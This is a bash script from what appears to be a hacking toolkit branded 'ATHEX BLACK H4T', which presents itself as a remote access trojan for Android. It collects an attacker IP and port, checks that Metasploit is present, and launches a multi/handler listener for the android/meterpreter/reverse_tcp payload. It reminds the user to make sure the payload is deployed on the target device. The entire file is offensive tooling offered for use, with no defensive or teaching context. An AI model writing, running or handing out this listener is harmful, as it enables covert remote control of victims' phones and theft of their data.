#!/bin/bash

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

echo -e "\033[0;33m"
echo "Executing the Listener ..."
sleep 1
echo -e "\033[0;36m"

# Get user input
read -p "Enter your IP/Host Address ===> " ip
read -p "Enter payload's listener port ===> " Port

# Validate inputs
if [[ -z "$ip" || -z "$Port" ]]; then
    echo -e "\033[0;31mError: IP and Port are required!\033[0m"
    echo "Press any key to continue..."
    read -n 1
    exit 1
fi

# Validate IP format (basic check)
if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && ! [[ $ip =~ ^[a-zA-Z0-9.-]+$ ]]; then
    echo -e "\033[0;33mWarning: IP format '$ip' may be invalid\033[0m"
    echo "Continue anyway? (y/n)"
    read -n 1 choice
    echo
    if [[ ! $choice =~ ^[Yy]$ ]]; then
        echo "Exiting..."
        exit 1
    fi
fi

# Validate port number
if ! [[ $Port =~ ^[0-9]+$ ]] || [ $Port -lt 1 ] || [ $Port -gt 65535 ]; then
    echo -e "\033[0;31mError: Port must be a number between 1 and 65535!\033[0m"
    echo "Press any key to continue..."
    read -n 1
    exit 1
fi

# Check if msfconsole is available
if ! command_exists msfconsole; then
    echo -e "\033[0;31mError: msfconsole not found!\033[0m"
    echo "Please install metasploit-framework first"
    echo "Press any key to continue..."
    read -n 1
    exit 1
fi

# Display configuration
clear
echo -e "\033[0;37m"
 echo -e "\033[0;37m------------------------------------------------" 
echo "     ╔═╗       ╔═╗╔═╗╔═╗╦╔═╗╔╦╗╦ ╦          ╦═╗  ╔═╗  ╔╦╗     "
echo "     ╠╣   ───  ╚═╗║ ║║  ║║╣  ║ ╚╦╝          ╠╦╝  ╠═╣   ║      "
echo "     ╚         ╚═╝╚═╝╚═╝╩╚═╝ ╩  ╩           ╩╚═  ╩ ╩   ╩      "
echo -e "\033[0;31m            POWER OF ATHEX BLACK H4T             "
echo -e "\033[0;29m             REMOTE ACCESS TROJAN FOR ANDROID    "
    echo -e "\033[0;37m---------------------------------------------" 
echo -e "\033[0;29m"

echo -e "\033[0;32mListener Configuration:\033[0m"
echo -e "\033[0;36mIP Address: $ip\033[0m"
echo -e "\033[0;36mPort: $Port\033[0m"
echo -e "\033[0;36mPayload: android/meterpreter/reverse_tcp\033[0m"
echo -e "\033[0;33m"

# Check if port is already in use
if command_exists netstat; then
    if netstat -tuln 2>/dev/null | grep -q ":$Port "; then
        echo -e "\033[0;31mWarning: Port $Port appears to be in use!\033[0m"
        echo "This may cause conflicts with the listener."
        echo "Continue anyway? (y/n)"
        read -n 1 choice
        echo
        if [[ ! $choice =~ ^[Yy]$ ]]; then
            echo "Exiting..."
            exit 1
        fi
    fi
fi

echo -e "\033[0;33mStarting Metasploit listener...\033[0m"
echo -e "\033[0;31mImportant Notes:\033[0m"
echo -e "\033[0;33m1. Make sure your payload is deployed on target device\033[0m"
echo -e "\033[0;33m2. Ensure firewall allows incoming connections on port $Port\033[0m"
echo -e "\033[0;33m3. Press Ctrl+C to stop the listener\033[0m"
echo -e "\033[0;33m4. This will start in 5 seconds...\033[0m"

# Countdown
for i in {5..1}; do
    echo -e "\033[0;36mStarting in $i...\033[0m"
    sleep 1
done

echo -e "\033[0;32mLaunching Metasploit...\033[0m"
echo -e "\033[0;37m"

# Execute Metasploit listener with error handling
if ! msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"; then
    echo -e "\033[0;31mFailed to start Metasploit listener!\033[0m"
    echo "Possible reasons:"
    echo "1. Metasploit service not running"
    echo "2. Insufficient permissions"
    echo "3. Port $Port is already in use"
    echo "4. Network configuration issues"
fi

echo -e "\033[0m"
echo -e "\033[0;33mListener session ended.\033[0m"
echo "Press any key to return to main menu..."
read -n 1